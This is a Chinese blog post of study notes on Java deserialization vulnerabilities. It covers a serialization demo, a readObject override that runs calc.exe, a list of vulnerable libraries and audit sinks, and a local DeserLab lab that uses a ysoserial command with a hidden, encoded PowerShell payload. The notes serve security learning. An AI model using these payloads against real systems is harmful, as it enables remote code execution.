---
title: Java 反序列化
date: 2018-04-08 18:13:23
tags:
		- 
categories:
		- 安全研究
---

`Java` 反序列化学习记录笔记，持续学习研究。

<!-- more -->


### [Java反序列化漏洞从入门到深入](https://xz.aliyun.com/t/2041)

 Java反序列化

学习以下技术文章，研究一下反序列化漏洞。

按照一些技术文章学习反序列化漏洞。




#### Java对象序列化

序列化是一种对象持久化的手段。

使用Java对象序列化，在保存对象时，会把其状态保存为一组字节。在反序列化时，再将这些字节组装成对象。对象序列化保存的是对象的“状态”，即它的成员变量。


#### 序列化过程和反序列化过程

[Java序列化和反序列化](http://www.cnblogs.com/canvas512732559/p/xuliehua.html)

java.io包有两个序列化对象的类。ObjectOutputStream负责将对象写入字节流，ObjectInputStream从字节流重构对象。

在Java中，只要一个类实现了java.io.Serializable接口，那么它就可以被序列化。

[深入分析Java的序列化与反序列化](http://www.hollischuang.com/archives/1140)

[Java 序列化](http://www.runoob.com/java/java-serialization.html)

[Java对象的序列化和反序列化](http://www.cnblogs.com/xdp-gacl/p/3777987.html)

>java.io.ObjectOutputStream代表对象输出流，它的writeObject(Object obj)方法可对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中。

>java.io.ObjectInputStream代表对象输入流，它的readObject()方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。

对象序列化包括如下步骤：

　　1） 创建一个对象输出流，它可以包装一个其他类型的目标输出流，如文件输出
流；

　　2） 通过对象输出流的writeObject()方法写对象。

对象反序列化的步骤如下：

　　1） 创建一个对象输入流，它可以包装一个其他类型的源输入流，如文件输入流；

　　2） 通过对象输入流的readObject()方法读取对象。


参考上面的文章，进行序列化和反序列化的学习。

一个`Person`类

	package com_sre;
	import java.io.Serializable;
	public class Person implements Serializable{
		
		/**
		 * 序列化ID
		 */
		private static final long serialVersionUID = -7770379408769870725L;
		private int age;
		private String name;
		private String sex;
		public int getAge() {
			return age;
		}
		public void setAge(int age) {
			this.age = age;
		}
		public String getName() {
			return name;
		}
		public void setName(String name) {
			this.name = name;
		}
		public String getSex() {
			return sex;
		}
		public void setSex(String sex) {
			this.sex = sex;
		}
		
	}

对其进行序列化和反序列化。

	package com_sre;
	import java.io.File;
	import java.io.FileInputStream;
	import java.io.FileNotFoundException;
	import java.io.FileOutputStream;
	import java.io.IOException;
	import java.io.ObjectInputStream;
	import java.io.ObjectOutputStream;
	import java.text.MessageFormat;
	public class sre_person {
		public static void main(String[] args) throws Exception {
			SerializePerson();   //序列化Person对象
			Person p = DeserializePerson();  //反序列化对象
			System.out.println(MessageFormat.format("name={0},age={1},sex={2}",p.getName(),p.getAge(),p.getSex()));		
		}
	
		private static void SerializePerson() throws FileNotFoundException,IOException {
			
			Person person = new Person(); //实例化
			person.setName("sec-note");
			person.setAge(26);
			person.setSex("男");
			// ObjectOutputStream 对象输出流，将Person对象存储到E盘的Person.txt文件中，完成对Person对象的序列化操作
			//ObjectOutputStream 输出流，其方法对 writeObject方法写对象
			ObjectOutputStream oo = new ObjectOutputStream(new FileOutputStream(
					   new File("E:/Person.txt")));
			oo.writeObject(person);
			System.out.println("Person对象序列化成功");
		}
		
		//反序列化
		private static Person DeserializePerson() throws Exception,IOException {
			ObjectInputStream ois = new ObjectInputStream(new FileInputStream(
					new File("E:/Person.txt")));
			Person person = (Person) ois.readObject(); //readObject()方法读取对象
			System.out.println("Person对象反序列化成功");
	    	return person;
		}
	
		
	
	}

结果

	Person对象序列化成功
	Person对象反序列化成功
	name=sec-note,age=26,sex=男

序列化的文件`Person.txt`

	 sr com_sre.Person?褻{ I ageL namet Ljava/lang/String;L sexq ~ xp   t sec-notet 鐢?


#### 简单的反序列化 demon

反序列化中，还会调用被反序列化的`readObject`方法，这个方法是默认的，当重写时，可以引发漏洞。

在上面的`Person`类中，重写`readObject`。重写readObject方法，加入了弹计算器的执行代码的内容

	private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{
		        //执行默认的readObject()方法
		        in.defaultReadObject();
		        //执行命令
		        Runtime.getRuntime().exec("calc.exe");
		    }


![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-4-3/97255792.jpg)

在`Person`类中重写了`readObject`方法，然后反序列化的时候，调用该方法，执行了相应的`payload`。

反序列化，其中的内置方法被重写。

#### 反序列化漏洞源头

__开发失误__

黑名单被绕过。

__基础库中隐藏的反序列化漏洞__

>2015年由黑客Gabriel Lawrence和Chris Frohoff发现的<font color=red>‘Apache Commons Collections’</font>类库直接影响了WebLogic、WebSphere、JBoss、Jenkins、OpenNMS等大型框架。

存在危险的基本库。

	commons-fileupload 1.3.1
	commons-io 2.4
	commons-collections 3.1
	commons-logging 1.2
	commons-beanutils 1.9.2
	org.slf4j:slf4j-api 1.7.21
	com.mchange:mchange-commons-java 0.2.11
	org.apache.commons:commons-collections 4.0
	com.mchange:c3p0 0.9.5.2
	org.beanshell:bsh 2.0b5
	org.codehaus.groovy:groovy 2.3.9
	org.springframework:spring-aop 4.1.4.RELEASE


引入用户可控的序列化数据，并使用不安全的基本库，就意味着存在反序列化漏洞。


#### 如何发现Java反序列化漏洞

##### 白盒审计

反序列化操作存在的地方。导入模板文件、网络通信、数据传输、日志格式化存储、对象数据落磁盘、或DB存储等业务场景。

通过检索源码中对反序列化函数的调用来静态寻找反序列化的输入点。

搜索以下函数。

	ObjectInputStream.readObject
	ObjectInputStream.readUnshared
	XMLDecoder.readObject
	Yaml.load
	XStream.fromXML
	ObjectMapper.readValue
	JSON.parseObject


小数点前面是类名，后面是方法名。

##### 黑盒测试

可以通过分析十六进制数据块，锁定某些存在漏洞的通用基础库（比如Apache Commons Collection）的调用地点，并进行数据替换，从而实现利用。


#### 环境测试

##### [DeserLab演示](https://github.com/NickstaDB/DeserLab)

[DeserLab演示](https://github.com/NickstaDB/DeserLab)是一个使用了`Groovy`库的简单网络协议应用，实现`client`和`server`端发送序列化数据的功能，该库和`Apache Commons Collection`库一样，含有可利用的POP链。

[生成有效载荷](http://jackson.thuraisamy.me/runtime-exec-payloads.html)

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-4-8/15517531.jpg)

用ysoserial生成针对Groovy库的payload

	E:\Download>java -jar ysoserial-master.jar  Groovy1 "powershell.exe -NonI -W Hid
	den -NoP -Exec Bypass -Enc bQBrAGQAaQByACAAcwBlAGMAXwBuAG8AdABlAA==" > payload2.
	bin

在DeserLab的Github项目页面下载DeserLab.jar
命令行下使用`java -jar DeserLab.jar -server 127.0.0.1 6666`开启本地服务端。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-4-8/79586731.jpg)

使用[deserlab_exploit.py](https://gist.github.com/DiabloHorn/8630948d953386d2ed575e17f8635ee7)脚本执行`payload`。

	python deserlab_exploit.py 127.0.0.1 6666 payload2.bin

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-4-8/97971690.jpg)

成功写入一个新文件，命令执行。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-4-8/52073188.jpg)


### [深入理解 JAVA 反序列化漏洞](https://paper.seebug.org/312/)

#### 反序列化和序列化的使用场景

有效的实现多平台之间的通信、对象持久化存储。

>HTTP：多平台之间的通信，管理等

>RMI：是 Java 的一组拥护开发分布式应用程序的 API，实现了不同操作系统之间程序的方法调用。值得注意的是，RMI 的传输 100% 基于反序列化，Java RMI 的默认端口是 1099 端口。

>JMX：JMX 是一套标准的代理和服务，用户可以在任何 Java 应用程序中使用这些代理和服务实现管理,中间件软件 WebLogic 的管理页面就是基于 JMX 开发的，而 JBoss 则整个系统都基于 JMX 构架。 


#### 漏洞成因

暴露或者间接暴露反序列化API，导致用户可以操作传入数据，攻击者可以精心构造反序列化对象并执行恶意代码。


​




#### 文章集锦

[Java反序列化漏洞研究](https://www.cnblogs.com/alert123/p/5124637.html)

[Java反序列化漏洞学习实践一：从Serializbale接口开始，先弹个计算器](http://www.polaris-lab.com/index.php/archives/447/)

[浅谈Java反序列化漏洞修复方案.md](https://github.com/Cryin/Paper/blob/master/%E6%B5%85%E8%B0%88Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88.md)


[java反序列化工具ysoserial分析](http://drops.xmd5.com/static/drops/papers-14317.html)





